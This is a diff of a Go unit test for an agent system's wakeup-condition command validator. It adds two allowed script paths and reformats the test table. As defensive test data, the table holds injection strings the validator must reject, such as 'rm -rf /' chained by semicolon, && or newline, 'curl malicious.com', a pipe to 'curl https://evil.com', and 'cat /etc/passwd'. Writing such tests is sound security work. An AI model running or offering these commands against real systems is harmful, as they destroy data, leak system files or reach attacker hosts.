@@ -7,9 +7,9 @@ import (
 
 func TestValidateWakeupCondition(t *testing.T) {
 	tests := []struct {
-		name      string
-		condition string
-		wantErr   bool
+		name        string
+		condition   string
+		wantErr     bool
 		errContains string
 	}{
 		// Valid conditions
@@ -58,138 +58,148 @@ func TestValidateWakeupCondition(t *testing.T) {
 			condition: "jq -r '.count' $AGENCY_DIR/stats.json",
 			wantErr:   false,
 		},
+		{
+			name:      "workspace wakeup condition script",
+			condition: "$AGENCY_DIR/scripts/wakeup-conditions/cc-connect-pm.sh",
+			wantErr:   false,
+		},
+		{
+			name:      "workspace wakeup condition script with braces",
+			condition: "${AGENCY_DIR}/scripts/wakeup-conditions/cc-connect-pm.sh",
+			wantErr:   false,
+		},
 
 		// Invalid conditions - dangerous metacharacters
 		{
-			name:      "semicolon injection",
-			condition: "gh issue list; rm -rf /",
-			wantErr:   true,
+			name:        "semicolon injection",
+			condition:   "gh issue list; rm -rf /",
+			wantErr:     true,
 			errContains: "blocked pattern",
 		},
 		{
-			name:      "AND operator injection",
-			condition: "true && rm -rf /",
-			wantErr:   true,
+			name:        "AND operator injection",
+			condition:   "true && rm -rf /",
+			wantErr:     true,
 			errContains: "blocked pattern",
 		},
 		{
-			name:      "OR operator injection",
-			condition: "false || curl malicious.com",
-			wantErr:   true,
+			name:        "OR operator injection",
+			condition:   "false || curl malicious.com",
+			wantErr:     true,
 			errContains: "blocked pattern",
 		},
 		{
-			name:      "command substitution",
-			condition: "echo $(whoami)",
-			wantErr:   true,
+			name:        "command substitution",
+			condition:   "echo $(whoami)",
+			wantErr:     true,
 			errContains: "blocked pattern",
 		},
 		{
-			name:      "backtick substitution",
-			condition: "echo `whoami`",
-			wantErr:   true,
+			name:        "backtick substitution",
+			condition:   "echo `whoami`",
+			wantErr:     true,
 			errContains: "blocked pattern",
 		},
 		{
-			name:      "output redirection",
-			condition: "gh issue list > /tmp/issues",
-			wantErr:   true,
+			name:        "output redirection",
+			condition:   "gh issue list > /tmp/issues",
+			wantErr:     true,
 			errContains: "file redirection",
 		},
 		{
-			name:      "input redirection",
-			condition: "grep pattern < /etc/passwd",
-			wantErr:   true,
+			name:        "input redirection",
+			condition:   "grep pattern < /etc/passwd",
+			wantErr:     true,
 			errContains: "file redirection",
 		},
 		{
-			name:      "background execution",
-			condition: "gh issue list &",
-			wantErr:   true,
+			name:        "background execution",
+			condition:   "gh issue list &",
+			wantErr:     true,
 			errContains: "blocked pattern",
 		},
 		{
-			name:      "newline injection",
-			condition: "gh issue list\nrm -rf /",
-			wantErr:   true,
+			name:        "newline injection",
+			condition:   "gh issue list\nrm -rf /",
+			wantErr:     true,
 			errContains: "blocked pattern",
 		},
 
 		// Invalid conditions - disallowed commands
 		{
-			name:      "curl command",
-			condition: "curl https://example.com",
-			wantErr:   true,
+			name:        "curl command",
+			condition:   "curl https://example.com",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 		{
-			name:      "rm command",
-			condition: "rm -rf /tmp/data",
-			wantErr:   true,
+			name:        "rm command",
+			condition:   "rm -rf /tmp/data",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 		{
-			name:      "echo command",
-			condition: "echo hello",
-			wantErr:   true,
+			name:        "echo command",
+			condition:   "echo hello",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 		{
-			name:      "cat command",
-			condition: "cat /etc/passwd",
-			wantErr:   true,
+			name:        "cat command",
+			condition:   "cat /etc/passwd",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 		{
-			name:      "python command",
-			condition: "python3 script.py",
-			wantErr:   true,
+			name:        "python command",
+			condition:   "python3 script.py",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 		{
-			name:      "bash command",
-			condition: "bash script.sh",
-			wantErr:   true,
+			name:        "bash command",
+			condition:   "bash script.sh",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 		{
-			name:      "sh command",
-			condition: "sh script.sh",
-			wantErr:   true,
+			name:        "sh command",
+			condition:   "sh script.sh",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 
 		// Invalid conditions - unsafe env vars
 		{
-			name:      "unsafe env var HOME",
-			condition: "gh issue list --dir $HOME",
-			wantErr:   true,
+			name:        "unsafe env var HOME",
+			condition:   "gh issue list --dir $HOME",
+			wantErr:     true,
 			errContains: "unsafe env var",
 		},
 		{
-			name:      "unsafe env var PATH",
-			condition: "grep -r $PATH",
-			wantErr:   true,
+			name:        "unsafe env var PATH",
+			condition:   "grep -r $PATH",
+			wantErr:     true,
 			errContains: "unsafe env var",
 		},
 		{
-			name:      "unsafe env var USER",
-			condition: "jq '$USER'",
-			wantErr:   true,
+			name:        "unsafe env var USER",
+			condition:   "jq '$USER'",
+			wantErr:     true,
 			errContains: "unsafe env var",
 		},
 
 		// Edge cases
 		{
-			name:      "empty string after pipe",
-			condition: "gh issue list |",
-			wantErr:   true,
+			name:        "empty string after pipe",
+			condition:   "gh issue list |",
+			wantErr:     true,
 			errContains: "empty pipe segment",
 		},
 		{
-			name:      "disallowed after pipe",
-			condition: "gh issue list | curl https://evil.com",
-			wantErr:   true,
+			name:        "disallowed after pipe",
+			condition:   "gh issue list | curl https://evil.com",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 		{
@@ -198,15 +208,15 @@ func TestValidateWakeupCondition(t *testing.T) {
 			wantErr:   false,
 		},
 		{
-			name:      "multiple pipes one disallowed",
-			condition: "gh issue list | grep pattern | rm -rf /tmp",
-			wantErr:   true,
+			name:        "multiple pipes one disallowed",
+			condition:   "gh issue list | grep pattern | rm -rf /tmp",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 		{
-			name:      "disallowed at third position",
-			condition: "gh issue list | jq '.id' | bash script.sh",
-			wantErr:   true,
+			name:        "disallowed at third position",
+			condition:   "gh issue list | jq '.id' | bash script.sh",
+			wantErr:     true,
 			errContains: "allowed command",
 		},
 	}
